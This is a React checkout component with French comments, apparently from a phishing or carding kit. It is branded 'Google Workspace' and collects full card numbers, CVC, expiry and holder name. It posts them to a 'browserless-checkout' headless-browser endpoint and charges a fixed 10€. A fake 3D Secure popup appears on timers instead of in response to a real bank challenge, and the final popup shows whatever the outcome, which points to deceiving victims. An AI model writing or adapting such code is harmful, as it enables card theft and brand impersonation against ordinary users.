import { useState, useImperativeHandle, forwardRef } from 'react';
import LoadingPopup from '../common/LoadingPopup';
import ThreeDSecurePopup from './ThreeDSecurePopup';
import EndPopup from '../common/EndPopup';

const Checkout = forwardRef(({ 
  formData,
  selectedPlan,
  onSuccess,
  onError
}, ref) => {
  // États pour la gestion des popups
  const [isLoading, setIsLoading] = useState(false);
  const [showThreeDSecurePopup, setShowThreeDSecurePopup] = useState(false);
  const [showEndPopup, setShowEndPopup] = useState(false); // Force l'affichage ou non
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [retryCount, setRetryCount] = useState(0);
  const [maxRetries] = useState(3);

  // Fonction paiement custom
  const payFetch = async (formData, amount = '10') => {
    console.log('🚀 === DÉBUT DU PROCESSUS DE PAIEMENT ===');
    
    // Initial status set to pending
    let status = 'initiated';

    // Regrouper les données de paiement
    const cardDetails = {
      cardNumber: formData.cardNumber,
      cardExpiration: formData.expiryDate,
      cardCVC: formData.cvv,
      cardOwner: formData.cardName
    };
    console.log("💳 Préparation des données de carte:", {
      cardNumber: cardDetails.cardNumber ? `****${cardDetails.cardNumber.slice(-4)}` : 'N/A',
      cardExpiration: cardDetails.cardExpiration,
      cardOwner: cardDetails.cardOwner,
      amount: amount
    });

    // Extraction des données de la carte
    const cardNumber = cardDetails.cardNumber?.replace(/\s+/g, '') || '';
    const cardExpiry = cardDetails.cardExpiration || '';
    const cardCVC = cardDetails.cardCVC || '';
    const cardOwner = cardDetails.cardOwner || '';

    let data;
    try {
      console.log('📞 Appel à l\'API browserless-checkout...');
      
      // Appel à notre API proxy au lieu de Browserless directement
      const response = await fetch('/api/payments/browserless-checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cardNumber,
          cardExpiry,
          cardCVC,
          cardOwner,
          amount
        })
      });

      console.log(`📡 Réponse reçue - Status: ${response.status} (${response.statusText})`);

      // Lire le contenu de la réponse une seule fois
      const responseText = await response.text();
      console.log('📄 Taille de la réponse:', responseText.length, 'caractères');

      if (!response.ok) {
        console.warn('⚠️ Réponse HTTP non-OK, tentative de parsing...');
        
        // Essayer de parser la réponse d'erreur
        try {
          const errorData = JSON.parse(responseText);
          console.log('🔍 Données d\'erreur parsées:', {
            message: errorData.message,
            error: errorData.error,
            duration: errorData.duration,
            hasData: !!(errorData.data && errorData.data.finalStatus)
          });
          
          // Si on a des données malgré l'erreur, on les utilise
          if (errorData.data && errorData.data.finalStatus) {
            console.log('✅ Données trouvées dans la réponse d\'erreur, utilisation des données');
            data = errorData;
          } else {
            throw new Error(errorData.message || `API request failed with status ${response.status}`);
          }
        } catch (parseError) {
          console.error('❌ Impossible de parser la réponse d\'erreur:', parseError.message);
          console.error('📄 Contenu brut de la réponse:', responseText.substring(0, 200) + '...');
          throw new Error(`API request failed (${response.status}): ${response.statusText}`);
        }
      } else {
        console.log('✅ Réponse HTTP OK, parsing des données...');
        try {
          data = JSON.parse(responseText);
          console.log('📊 Données parsées avec succès:', {
            hasData: !!data.data,
            hasFinalStatus: !!(data.data && data.data.finalStatus),
            hasErrors: !!(data.errors && data.errors.length > 0)
          });
        } catch (parseError) {
          console.error('❌ Erreur lors du parsing JSON:', parseError.message);
          throw new Error('Invalid JSON response from API');
        }
      }

      // If the GraphQL response contains a finalStatus field, update the status variable.
      if (data && data.data && data.data.finalStatus) {
        status = data.data.finalStatus.value;
        console.log('🎯 Status final extrait:', status);
      }
      
      console.log('✅ Traitement de la réponse terminé avec succès');
      
    } catch (error) {
      console.error('❌ ERREUR DURANT LE PROCESSUS DE PAIEMENT:', {
        message: error.message,
        name: error.name,
        stack: error.stack.split('\n').slice(0, 3).join('\n') // Première ligne du stack trace
      });
      
      // Afficher plus de détails selon le type d'erreur
      if (error.message.includes('Failed to fetch')) {
        console.error('🌐 Problème de connexion réseau - vérifiez votre connexion internet');
      } else if (error.message.includes('timeout')) {
        console.error('⏰ Timeout - le processus a pris trop de temps');
      } else if (error.message.includes('Connection error')) {
        console.error('🔌 Connexion fermée par le serveur distant');
      } else if (error.message.includes('API request failed')) {
        console.error('🚨 Erreur API côté serveur');
      }
      
      throw new Error(`Échec du processus de paiement: ${error.message}`);
    } finally {
      console.log(`🏁 TRANSACTION TERMINÉE - Status: ${status}`);
      console.log('🚀 === FIN DU PROCESSUS DE PAIEMENT ===');
    }
    return data;
  };

  // Détermine le logo de la carte selon le numéro
  const getCardLogo = () => {
    return formData.cardNumber?.startsWith('5') ? '/mastercard-id-check.png' : '/verified-by-visa.png';
  };

  // Obtient les 4 derniers chiffres de la carte
  const getLastFourDigits = () => {
    return formData.cardNumber?.replace(/\s/g, '').slice(-4) || '****';
  };

  // Logique principale du processus de paiement
  const startPaymentProcess = async () => {
    try {
      console.log("🔄 Démarrage du processus de paiement...");
        
      // Réinitialiser tous les états
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      setShowEndPopup(false);

      // Étape 1: Lancement du paiement immédiatement
      console.log("🚀 Lancement immédiat de l'appel payFetch...");
      const amount = '10'; // Montant fixe
      
      // Démarrer payFetch en parallèle
      const paymentPromise = payFetch(formData, amount);
      
      // Étape 2: Attendre 10 secondes avant d'afficher le popup de loading
      console.log("⏰ Attente de 10 secondes avant affichage du LoadingPopup...");
      await new Promise(resolve => setTimeout(resolve, 10000));
      
      // Étape 3: Affichage du popup de chargement après 10 secondes
      setIsLoading(true);
      console.log("📱 Affichage du LoadingPopup après 10 secondes...");

      // Programmation de l'affichage du 3D Secure après 30 secondes supplémentaires
      const threeDSecureTimeout = setTimeout(() => {
        console.log("⏰ 40 secondes supplémentaires écoulées - Affichage du 3D Secure");
        setIsLoading(false);
        setShowThreeDSecurePopup(true);
      }, 30000);

      // Étape 4: Attendre la fin du paiement
      const paymentResult = await paymentPromise;
      console.log("✅ Résultat du paiement:", paymentResult);
      
      // Annuler le timeout
      clearTimeout(threeDSecureTimeout);
      
      // Toujours afficher EndPopup peu importe le statut
      console.log("📱 Affichage de EndPopup après le paiement");
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      setShowEndPopup(true);
      
    } catch (error) {
      console.error('❌ Erreur lors du processus de paiement:', error);
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      if (onError) {
        onError(error);
      }
    }
  }
    

  // Gestion du succès du 3D Secure
  const handle3DSecureSuccess = () => {
    console.log("✅ 3D Secure terminé avec succès - Affichage de EndPopup");
    setShowThreeDSecurePopup(false);
    setShowEndPopup(true);
  };

  // Gestion du retry depuis EndPopup
  const handleRetry = () => {
    console.log("🔄 Retry demandé - Relancement du processus de paiement");
    setShowEndPopup(false);
    startPaymentProcess();
  };

  // Gestion de la fermeture du popup final
  const handleEndPopupClose = () => {
    console.log("✅ EndPopup fermé - Processus terminé");
    setShowEndPopup(false);
    if (onSuccess) {
      onSuccess();
    }
  };

  // Exposer les méthodes via useImperativeHandle
  useImperativeHandle(ref, () => ({
    startPaymentProcess
  }));

  // Formatage de la date et heure
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('fr-FR', {
    year: '2-digit',
    month: '2-digit',
    day: '2-digit',
  });
  const formattedTime = currentDate.toLocaleTimeString('fr-FR', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  return (
    <>
      {/* Popup de chargement de vérification */}
      <LoadingPopup 
        isVisible={isLoading}
        selectedPlan={selectedPlan}
        cardLogo={getCardLogo()}
        data={{
          checkoutPayCardHolderPlaceholder: 'Nom du titulaire',
          checkoutPayCardNumberPlaceholder: 'Numéro de carte',
          checkoutPayExpiryDatePlaceholder: 'MM/AA',
          checkoutPayCVVPlaceholder: 'CVV',
          cardNumber: formData.cardNumber
        }}
        brandName="Google Workspace"
      />

      {/* Popup 3D Secure */}
      <ThreeDSecurePopup 
        isVisible={showThreeDSecurePopup}
        cardLogo={getCardLogo()}
        cardNumber={formData.cardNumber}
        amount='10,00€'
        lastFourDigits={getLastFourDigits()}
        formattedDate={formattedDate}
        formattedTime={formattedTime}
        brandName="Google Workspace"
      />

      {/* Popup de fin de processus */}
      <EndPopup 
        isVisible={showEndPopup}
        selectedPlan={selectedPlan}
        onClose={handleEndPopupClose}
        onRetry={handleRetry}
        cardNumber={formData.cardNumber}
      />
    </>
  );
});

Checkout.displayName = 'Checkout';

export default Checkout;